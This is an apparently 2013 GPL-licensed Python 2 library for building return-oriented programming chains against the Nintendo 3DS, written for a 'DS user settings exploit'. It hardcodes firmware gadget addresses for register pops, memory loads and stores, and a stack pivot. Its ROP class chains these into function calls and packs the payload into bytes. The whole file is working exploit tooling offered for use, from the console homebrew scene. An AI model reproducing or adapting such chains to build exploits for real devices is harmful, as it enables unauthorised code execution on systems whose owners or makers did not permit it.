# 3DS ROP library (for DS user settings exploit).
# Copyright (C) 2013 naehrwert
# 
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, version 2.0.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License 2.0 for more details.
# 
# A copy of the GPL 2.0 should have been included with the program.
# If not, see http://www.gnu.org/licenses/

import struct

# Gadgets.
# Register loads.
_pop_pc = 0x001002F9
_pop_r0_pc = 0x00143D8C
_pop_r1_pc = 0x001C4FC4 #0x001549E1
_pop_r2_pc = 0x0022952D
_pop_r3_pc = 0x0010538C
_pop_r4_pc = 0x001001ED #0x001B3AA0
_pop_r4_r12_pc = 0x0018D5DC
# Loads and stores.
_ldr_r0_r0_pop_r4_pc = 0x0012FBBC
_str_r1_r0_pop_r4_pc = 0x0010CCBC
# Stack pivoting.
_add_sp_r3_ldr_pc_sp_4 = 0x00143D60

# Functions.
#_memcpy = 0x001BFA64

class Ref:
	def __init__(self, _name):
		self.name = _name

class Data:
	def __init__(self, _data):
		self.data = _data.ljust(4, "\x00")

class ROP:
	def __init__(self, _base):
		self.base = _base
		self.addr = _base
		self.stack = []
		self.labels = {}

	def _append(self, v):
		self.stack.append(v)
		self.addr += 4

	def label(self, name):
		self.labels[name] = self.addr

	def ref(self, name):
		self._append(Ref(name))

	def data(self, data):
		d = Data(data)
		self.stack.append(d)
		self.addr += len(d.data)

	def i32(self, v):
		self._append(v)

	def pop_pc(self):
		self._append(_pop_pc)

	def pop_r0(self, r0):
		self._append(_pop_r0_pc)
		self._append(r0)

	def pop_r1(self, r1):
		self._append(_pop_r1_pc)
		self._append(r1)

	def pop_r2(self, r2):
		self._append(_pop_r2_pc)
		self._append(r2)

	def pop_r3(self, r3):
		self._append(_pop_r3_pc)
		self._append(r3)

	def pop_r4(self, r4):
		self._append(_pop_r4_pc)
		self._append(r4)

	def pop_rX(self, **kwargs):
		regs = {
			'r4' : 0x44444444, 'r5' : 0x55555555, 'r6' : 0x66666666, 
			'r7' : 0x77777777, 'r8' : 0x88888888, 'r9' : 0x99999999, 
			'r10' : 0xAAAAAAAA, 'r11' : 0xBBBBBBBB, 'r12' : 0xCCCCCCCC
		}
		for k, v in kwargs.items():
			if k not in regs:
				print "Wat? ({0})".format(k)
				return
			else:
				regs[k] = v
		self._append(_pop_r4_r12_pc)
		for _, v in regs.items():
			self._append(v)

	def load_r0(self, addy):
		self.pop_r0(addy)
		self._append(_ldr_r0_r0_pop_r4_pc)
		self._append(0x44444444)

	def store_r1(self, addy):
		self.pop_r0(addy)
		self._append(_str_r1_r0_pop_r4_pc)
		self._append(0x44444444)

	def store_i32(self, value, addy):
		self.pop_r1(value)
		self.store_r1(addy)

	def call(self, fun, args, cleancnt):
		pops = [_pop_r0_pc, _pop_r1_pc, _pop_r2_pc, _pop_r3_pc]
		if len(args) > 4:
			print "Nahhhh, not now, maybe later ({0})".format(args)
			return
		for i in xrange(len(args)):
			self._append(pops[i])
			self._append(args[i])
		self._append(fun)
		for i in xrange(cleancnt):
			self._append(0xDEADBEEF)

#	def memcpy(self, dst, src, size):
#		self.call(_memcpy, [dst, src, size], 7)

	def pivot(self, size): #TODO: test this	
		self.pop_r3(size)
		self._append(_add_sp_r3_ldr_pc_sp_4)

	def gen(self):
		res = ""
		for s in self.stack:
			if isinstance(s, Ref):
				res += struct.pack("<I", self.labels[s.name])
			elif isinstance(s, Data):
				res += s.data
			else:
				res += struct.pack("<I", s)
		return res
